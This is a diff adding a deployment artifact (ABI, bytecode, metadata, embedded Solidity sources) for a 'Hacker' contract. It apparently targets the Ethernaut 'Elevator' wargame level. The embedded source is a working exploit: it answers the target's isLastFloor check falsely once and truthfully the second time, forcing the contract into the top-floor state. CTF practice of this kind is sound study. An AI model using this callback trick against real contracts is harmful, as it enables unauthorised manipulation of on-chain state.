@@ -1,0 +1,130 @@
+{
+  "address": "0xFBa6C9baEc8b9049C3ea782e0e528a1cF4773b3a",
+  "abi": [
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "target_",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "nonpayable",
+      "type": "constructor"
+    },
+    {
+      "inputs": [],
+      "name": "attack",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "isCaller",
+      "outputs": [
+        {
+          "internalType": "bool",
+          "name": "",
+          "type": "bool"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        {
+          "internalType": "uint256",
+          "name": "o",
+          "type": "uint256"
+        }
+      ],
+      "name": "isLastFloor",
+      "outputs": [
+        {
+          "internalType": "bool",
+          "name": "",
+          "type": "bool"
+        }
+      ],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "target",
+      "outputs": [
+        {
+          "internalType": "address",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    }
+  ],
+  "transactionHash": "0x6a7ff6dd8fb61705b82aad1a50fcfa70d5edf3ca02275e954878866cafc083e7",
+  "receipt": {
+    "to": null,
+    "from": "0x66fA22aEfb2cF14c1fA45725c36C2542521C0d3E",
+    "contractAddress": "0xFBa6C9baEc8b9049C3ea782e0e528a1cF4773b3a",
+    "transactionIndex": 25,
+    "gasUsed": "167582",
+    "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+    "blockHash": "0x6938511f2c52283fb628d493e99b6834bebbfb927dc5f94dc82460596d380882",
+    "transactionHash": "0x6a7ff6dd8fb61705b82aad1a50fcfa70d5edf3ca02275e954878866cafc083e7",
+    "logs": [],
+    "blockNumber": 9916396,
+    "cumulativeGasUsed": "2285037",
+    "status": 1,
+    "byzantium": true
+  },
+  "args": [
+    "0x26788B512f009722aD13B7ab00E22281475ef9Ab"
+  ],
+  "numDeployments": 1,
+  "solcInputHash": "b0e75a63693bb3ad639ecf0e1e5686eb",
+  "metadata": "{\"compiler\":{\"version\":\"0.6.0+commit.26b70077\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"target_\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isCaller\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"o\",\"type\":\"uint256\"}],\"name\":\"isLastFloor\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"target\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"contracts/Hacker.sol\":\"Hacker\"},\"evmVersion\":\"berlin\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Elevator.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.6.0;\\n\\ninterface Building {\\n    function isLastFloor(uint256) external returns (bool);\\n}\\n\\ncontract Elevator {\\n    bool public top;\\n    uint256 public floor;\\n\\n    function goTo(uint256 _floor) public {\\n        Building building = Building(msg.sender);\\n\\n        if (!building.isLastFloor(_floor)) {\\n            floor = _floor;\\n            top = building.isLastFloor(floor);\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0x708c18f260cb0054b657a4b9931f8f3411a9d8c0ada107fb7b27352955548ecd\"},\"contracts/Hacker.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.6.0;\\n\\nimport \\\"./Elevator.sol\\\";\\n\\ncontract Hacker is Building {\\n    address public target;\\n    bool public isCaller;\\n\\n    constructor(address target_) public {\\n        target = target_;\\n    }\\n\\n    function isLastFloor(uint256 o) external override returns (bool) {\\n        if (isCaller) {\\n            return true;\\n        }\\n        isCaller = true;\\n        return false;\\n    }\\n\\n    function attack() external {\\n        Elevator(target).goTo(101);\\n    }\\n}\\n\",\"keccak256\":\"0xc46c28f338ea2cbc57eb9ceec2fe28db18f3dfc68d2231f91a6c471afb2f2ad5\"}},\"version\":1}",
+  "bytecode": "0x608060405234801561001057600080fd5b506040516102093803806102098339818101604052602081101561003357600080fd5b5051600080546001600160a01b039092166001600160a01b03199092169190911790556101a4806100656000396000f3fe608060405234801561001057600080fd5b506004361061004c5760003560e01c806349cf442d146100515780635f9a4bca1461006d5780639e5faafc1461008a578063d4b8399214610094575b600080fd5b6100596100b8565b604080519115158252519081900360200190f35b6100596004803603602081101561008357600080fd5b50356100c8565b6100926100fd565b005b61009c61015f565b604080516001600160a01b039092168252519081900360200190f35b600054600160a01b900460ff1681565b60008054600160a01b900460ff16156100e3575060016100f8565b506000805460ff60a01b1916600160a01b1781555b919050565b6000805460408051633b669c4d60e21b81526065600482015290516001600160a01b039092169263ed9a71349260248084019382900301818387803b15801561014557600080fd5b505af1158015610159573d6000803e3d6000fd5b50505050565b6000546001600160a01b03168156fea26469706673582212208ae29f6b401d5c174f5a392e4ad3dd627722da3e2570b5f8a28a646f5b6ad17a64736f6c63430006000033",
+  "deployedBytecode": "0x608060405234801561001057600080fd5b506004361061004c5760003560e01c806349cf442d146100515780635f9a4bca1461006d5780639e5faafc1461008a578063d4b8399214610094575b600080fd5b6100596100b8565b604080519115158252519081900360200190f35b6100596004803603602081101561008357600080fd5b50356100c8565b6100926100fd565b005b61009c61015f565b604080516001600160a01b039092168252519081900360200190f35b600054600160a01b900460ff1681565b60008054600160a01b900460ff16156100e3575060016100f8565b506000805460ff60a01b1916600160a01b1781555b919050565b6000805460408051633b669c4d60e21b81526065600482015290516001600160a01b039092169263ed9a71349260248084019382900301818387803b15801561014557600080fd5b505af1158015610159573d6000803e3d6000fd5b50505050565b6000546001600160a01b03168156fea26469706673582212208ae29f6b401d5c174f5a392e4ad3dd627722da3e2570b5f8a28a646f5b6ad17a64736f6c63430006000033",
+  "devdoc": {
+    "methods": {}
+  },
+  "userdoc": {
+    "methods": {}
+  },
+  "storageLayout": {
+    "storage": [
+      {
+        "astId": 52,
+        "contract": "contracts/Hacker.sol:Hacker",
+        "label": "target",
+        "offset": 0,
+        "slot": "0",
+        "type": "t_address"
+      },
+      {
+        "astId": 54,
+        "contract": "contracts/Hacker.sol:Hacker",
+        "label": "isCaller",
+        "offset": 20,
+        "slot": "0",
+        "type": "t_bool"
+      }
+    ],
+    "types": {
+      "t_address": {
+        "encoding": "inplace",
+        "label": "address",
+        "numberOfBytes": "20"
+      },
+      "t_bool": {
+        "encoding": "inplace",
+        "label": "bool",
+        "numberOfBytes": "1"
+      }
+    }
+  }
+}
